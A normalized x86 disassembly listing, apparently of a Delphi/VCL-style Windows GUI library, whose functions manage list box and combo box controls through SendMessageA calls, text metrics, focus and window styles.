je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_444214
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_437938
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_437977
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_444044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43797e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_43797e
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_4374c8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4379f8
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
call SendMessageA
sub_4379f8
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_437a34
pop ebx
retn
sub_437a34
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_422ecc
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_440084
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_437b00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_444c04
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_437b38
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4470c4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4470c4
push eax
call SendMessageA
sub_437b78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4466a4
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_4379f8
mov eax ebx
call sub_44462c
sub_437bac
push ebx
mov ebx eax
mov eax ebx
call sub_4465e8
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_437a34
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_437bf4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446440
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_4376b8
sub_437c30
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4473c8
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403418
push 0xfffffff0
mov eax esi
call sub_4470c4
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_437c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4481a4
pop esi
pop ebx
retn
sub_437c84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442d84
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_437ca8
push ebx
mov ebx eax
mov eax ebx
call sub_44ce8c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_437ce0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_437d36
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_437d44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442db8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_437d98
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_447b94
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_437df0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_444aa0
mov eax ebx
mov si 0xffb5
call sub_403418
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4470c4
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403418
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_437e68
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_432154
mov ebx eax
mov eax ebx
call sub_432234
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4470c4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_432334
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437eb4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_432154
call sub_432234
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4454e0
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_437ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443f18
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_437f18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437d44
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_440060
mov edx 0x19
mov eax esi
call sub_440084
mov dl 0x1
mov eax esi
call sub_4472f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_437fa4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4473c8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4470c4
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4470c4
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_437ff8
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4473c8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4576d8
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_441a58
sub_43802c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443e44
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_438094
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_446508
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4575e0
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403418
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438101
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43817a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457668
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446510
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403418
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438181
sub_438188
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_446518
pop edi
pop esi
pop ebx
retn
sub_4381dc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_432154
call sub_432234
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_438208
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_432154
mov ebx eax
mov eax ebx
call sub_432234
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4470c4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_432334
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438270
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_438334
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_4470c4
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_439ed4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045b8
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41ad68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43833b
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40442c
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_4470c4
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045b8
sub_438344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4383c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403418
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_439ef4
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383ce
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41ad68
sub_4383d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403418
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403418
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403418
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_438458
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403418
sub_438480
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43850d
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438514
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
push 0x0
push 0x180
mov eax edi
call sub_4470c4
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
sub_438520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4385a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385b0
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
push edi
push 0x181
mov eax esi
call sub_4470c4
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
sub_4385c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438718
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43871f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_41abec
xor eax eax
push ebp
push sub_4386f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403418
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403418
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403418
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403418
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_438738
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4470c4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_440de0
sub_43876c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_40442c
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_4470c4
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_439f1c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4387b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4388af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4388b6
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_41abec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_438892
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41aca8
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403418
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403418
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403418
sub_4388c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_442db8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_440060
mov edx 0x61
mov eax ebx
call sub_440084
mov dl 0x1
mov eax ebx
call sub_4472f8
xor edx edx
mov eax ebx
call sub_440a68
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43f480
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4389ac
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442edc
mov eax [ esi + 0x228 ]
call sub_40321c
mov eax [ esi + 0x218 ]
call sub_40321c
mov eax [ esi + 0x240 ]
call sub_40321c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_438a78
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_438a98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_438ad4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_438af4
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_438b28
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_438f7c
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_438b70
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_438c87
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438c8e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40442c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404164
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40442c
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404164
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_438f2c
test al al
je r-xdata
jmp r-xdata
sub_438c98
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
